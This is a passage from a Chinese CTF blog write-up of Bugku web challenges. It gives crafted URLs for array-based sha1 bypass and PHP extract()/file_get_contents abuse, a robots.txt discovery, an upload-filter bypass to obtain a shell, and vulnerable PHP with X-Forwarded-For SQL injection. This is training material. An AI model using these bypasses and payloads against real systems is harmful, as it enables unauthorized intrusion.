<p>最开始获取id时需要用urldecode解码（如果没有用url编码，解码还是原来的东西）<br><br>这里的sha1也存在和md5一样的数组漏洞，具体漏洞我博客有.<br><br>构造payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web7/?id=margin&amp;uname[]=1</span><br></pre></td></tr></table></figure></p>
<p>post为:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd[]=2</span><br></pre></td></tr></table></figure></p>
<p>得到flag.</p>
<h3 id="0x32-web8"><a href="#0x32-web8" class="headerlink" title="0x32 web8"></a>0x32 web8</h3><p>题目hint:txt？？？？<br><br>打开后源码如下:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">extract($_GET);</span><br><span class="line">if (!empty($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line">if ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>empty()检测变量ac是否为空，若不为空则输出0</li>
<li>trim() 函数移除字符串两侧的空白字符或其他预定义字符。<br>总的来说file_get_contents要读取一个文本，且文本内容等于ac，根据题目提示我们在flag.txt下发现flags内容，于是构造如下payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web8/?ac=flags&amp;fn=flag.txt</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>看了别人wp发现还有一种方法，就是file_get_content，可以利用php://input</p>
<h3 id="0x33-细心"><a href="#0x33-细心" class="headerlink" title="0x33 细心"></a>0x33 细心</h3><p>打开后什么也没有,于是尝试爬虫协议robots.txt发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /resusl.php</span><br></pre></td></tr></table></figure></p>
<p>于是访问resusl.php<br><img src="http://p1vrkwaxt.bkt.clouddn.com/$S%60~IRQ_VC%5DZNN%29DQ5B%7D58V.png" alt="image"><br>根据题目提示给的admin，于是构造如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web13/resusl.php?x=admin</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<h3 id="0x34-求getshell"><a href="#0x34-求getshell" class="headerlink" title="0x34 求getshell"></a>0x34 求getshell</h3><p>原理:后缀名黑名单加类型检测</p>
<ul>
<li>头部的Content-Type改成Multipart/form-data大小写绕过waf(这个我一直不明白)</li>
<li>文件名改为php5</li>
</ul>
<h2 id="0x35-INSERT-INTO注入"><a href="#0x35-INSERT-INTO注入" class="headerlink" title="0x35 INSERT INTO注入"></a>0x35 INSERT INTO注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flag格式：flag&#123;xxxxxxxxxxxx&#125;</span><br><span class="line">不如写个Python吧</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip = &apos;&apos;;</span><br><span class="line">if(isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]))&#123;</span><br><span class="line">$ip = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(&apos;,&apos;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=&quot;localhost&quot;;</span><br><span class="line">$user=&quot;&quot;;</span><br><span class="line">$pass=&quot;&quot;;</span><br><span class="line">$db=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line">echo &apos;your ip is :&apos;.$ip;</span><br><span class="line">$sql=&quot;insert into client_ip (ip) values (&apos;$ip&apos;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a  href="/2018/07/06/bugkuCTF web/">bugkuCTF Web</a></p>
        <p><span>文章作者:</span><a  href="/" title="访问 Mr1.Grim 的个人博客">Mr1.Grim</a></p>
        <p><span>发布时间:</span>2018年07月06日 - 13时24分</p>
        <p><span>最后更新:</span>2018年07月06日 - 18时37分</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2018/07/06/bugkuCTF web/" title="bugkuCTF Web">http://yoursite.com/2018/07/06/bugkuCTF web/</a>
            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/07/06/bugkuCTF web/　　作者: Mr1.Grim" title=""></span>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



<nav id="article-nav">
  
    <a  href="/2018/07/06/2018 iscc web/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          2018 ISCC web
        
      </div>
    </a>
  
  
</nav>


  
</article>

    <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-web2"><span class="toc-number">1.</span> <span class="toc-text">0x01 web2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-文件上传测试"><span class="toc-number">2.</span> <span class="toc-text">0x02 文件上传测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-计算器"><span class="toc-number">3.</span> <span class="toc-text">0x03 计算器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-web基础-GET"><span class="toc-number">4.</span> <span class="toc-text">0x04 web基础$_GET</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-web基础-POST"><span class="toc-number">5.</span> <span class="toc-text">0x05 web基础$_POST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-矛盾"><span class="toc-number">6.</span> <span class="toc-text">0x06 矛盾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-web3"><span class="toc-number">7.</span> <span class="toc-text">0x07 web3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-sql注入"><span class="toc-number">8.</span> <span class="toc-text">0x08 sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-域名解析"><span class="toc-number">9.</span> <span class="toc-text">0x09 域名解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-SQL注入1"><span class="toc-number">10.</span> <span class="toc-text">0x10 SQL注入1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-你必须让他停下"><span class="toc-number">11.</span> <span class="toc-text">0x11 你必须让他停下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12-本地包含"><span class="toc-number">12.</span> <span class="toc-text">0x12 本地包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x13-变量1"><span class="toc-number">13.</span> <span class="toc-text">0x13 变量1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X14-web5"><span class="toc-number">14.</span> <span class="toc-text">0X14 web5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x15-flag在index里"><span class="toc-number">15.</span> <span class="toc-text">0x15 flag在index里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x16-输入密码查看flag"><span class="toc-number">16.</span> <span class="toc-text">0x16 输入密码查看flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x17-点击一百万次"><span class="toc-number">17.</span> <span class="toc-text">0x17 点击一百万次</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x18-备份是个好习惯"><span class="toc-number">18.</span> <span class="toc-text">0x18 备份是个好习惯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x19-成绩单"><span class="toc-number">19.</span> <span class="toc-text">0x19 成绩单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x20-秋名山老司机"><span class="toc-number">20.</span> <span class="toc-text">0x20 秋名山老司机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x21-速度要快"><span class="toc-number">21.</span> <span class="toc-text">0x21 速度要快</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x22-cookie欺骗"><span class="toc-number">22.</span> <span class="toc-text">0x22 cookie欺骗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x23-xss"><span class="toc-number">23.</span> <span class="toc-text">0x23 xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x23-never-give-up"><span class="toc-number">24.</span> <span class="toc-text">0x23 never give up</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x24-welcome-to-bugkuctf"><span class="toc-number">25.</span> <span class="toc-text">0x24 welcome to bugkuctf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x25-过狗一句话"><span class="toc-number">26.</span> <span class="toc-text">0x25 过狗一句话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x26-字符？正则？"><span class="toc-number">27.</span> <span class="toc-text">0x26 字符？正则？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x27-前女友-SKCTF"><span class="toc-number">28.</span> <span class="toc-text">0x27 前女友(SKCTF)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x28-login1-SKCTF"><span class="toc-number">29.</span> <span class="toc-text">0x28 login1(SKCTF)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x29-你从哪里来"><span class="toc-number">30.</span> <span class="toc-text">0x29 你从哪里来</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x30-md5-collision-NUPT-CTF"><span class="toc-number">31.</span> <span class="toc-text">0x30 md5 collision(NUPT_CTF)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x31-各种绕过"><span class="toc-number">32.</span> <span class="toc-text">0x31 各种绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x32-web8"><span class="toc-number">33.</span> <span class="toc-text">0x32 web8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x33-细心"><span class="toc-number">34.</span> <span class="toc-text">0x33 细心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x34-求getshell"><span class="toc-number">35.</span> <span class="toc-text">0x34 求getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x35-INSERT-INTO注入"><span class="toc-number"></span> <span class="toc-text">0x35 INSERT INTO注入</span></a>
</div>
<style>
    .left-col .switch-btn {
        display: none;
    }
    .left-col .switch-area {
        display: none;
    }
</style>
<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>

<script>
    var valueHide = "隐藏目录";
    var valueShow = "显示目录";
    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }
    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
            $(".switch-btn, .switch-area").fadeOut(300);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
            $(".switch-btn, .switch-area").fadeIn(500);
        }
    })
    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
        $(".switch-btn, .switch-area").show();
    }
</script>




<div class="bdsharebuttonbox">
	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
</div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>




    
        <section class="changyan" id="comments">
  <!--<div id="uyan_frame"></div>-->
  <div id="SOHUCS"></div>
  <script charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/changyan.js"></script>
  <script type="text/javascript">
    window.changyan.api.config({
      appid: 'xxxx',
      conf: 'xxxxxxxxx'
    });
  </script>
</section>
    



    <div class="scroll" id="post-nav-button">
        
            <a  href="/2018/07/06/2018 iscc web/" title="上一篇: 2018 ISCC web">
                <i class="fa fa-angle-left"></i>
            </a>
        
        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
        
            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
        
    </div>
    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/09/07/order by 盲注/">SQL注入之order by盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/06/SJUCTF/">2018暑假校内赛SJUCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/15/2018XMAN夏令营/">QCTF2018-XMan选拔赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/10/md5哈希扩展攻击/">MD5哈希(hash)长度扩展攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/常见文件头/">CTF常见文件头标志</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/基于布尔盲注的SQL/">基于布尔盲注的学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/变量覆盖漏洞/">代码审计|变量覆盖漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/截断问题/">PHP %00截断原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/xxe漏洞/">在JSON中玩转XXE攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/关于SSR配置/">chrome 代理设置ss(ssr)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/XSS/">XSS注入原理及应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/yuanma/">文件源码泄漏大全</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/wangluo3/">网络安全实验室-注入关</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/wangluo2/">网络安全实验室-脚本关</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/wangluo1/">网络安全实验室-基础关</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/xxe漏洞复现/">xxe漏洞的复现解析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/vmheipeing/">VM一直多次黑屏问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/sql报错注入/">SQL 报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/SQL约束攻击/">基于约束的SQL攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/sqlmohu/">MySql模糊查询</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/sqlmap/">sqlmap基础用法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/sqlkuanzijie/">sql宽字节注入原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/PHP正则表达式/">PHP正则表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/PHP漏洞总结/">PHP函数漏洞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/PHP魔术方法/">PHP之魔术方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/requests/">Python爬虫requests的使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/sql/">sql</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/saibo/">赛博地球杯工业互联网安全大赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/php伪协议/">PHP伪协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/PHP中SESSION反序列化机制/">PHP之SESSION反序列化机制</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/php/">PHP基础知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/phpruoleixing/">PHP弱类型总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/PHP反序列化/">PHP反序列化漏洞绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/PHP文件包含漏洞/">文件包含漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/md5之sql注入/">MD5加密下的SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/n1ctf/">N1CTF WEB</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/hexo/">hexo的相关配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/DVWA之File Upload/">DVWA之File Upload</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/DVWA之SQL Injection/">DVWA之SQL Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/Jarivs oj/">Jarivs Oj Web</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/DVWA之CSRF漏洞/">DVWA之CSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/DHB/">东华杯布尔盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/DVWA之File Inclusion/">DVWA之File Inclusion</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/DVWA之Commad injection/">DVWA之 Command Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/docker/">Docker复现CTF Web题</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/DDCTF部分wp/">DDCTF部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/CBC字节翻转攻击/">CBC字节翻转攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/bugkuCTF 代码审计/">Bugku 代码审计</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/bugkuCTF misc/">bugkuCTF Misc</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/CTFawd/">AWD 校内练习赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/2018 iscc web/">2018 ISCC web</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/bugkuCTF web/">bugkuCTF Web</a></li></ul>
    
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>

    <script>
        $(".post-list").addClass("toc-article");
        // $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#toc, .switch-btn, .switch-area").toggle();
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
                $(".switch-btn, .switch-area").fadeToggle(300);
            }
        })
    </script>




    <script>
        
    </script>

</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2018 Mr1.Grim
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >极客到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>

<script src="/js/main.js"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 1;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>


<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'xxxxx', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->



	<script>
	var _hmt = _hmt || [];
	(function() {
	  var hm = document.createElement("script");
	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
	  var s = document.getElementsByTagName("script")[0]; 
	  s.parentNode.insertBefore(hm, s);
	})();
	</script>



<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(
            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
</body>
</html>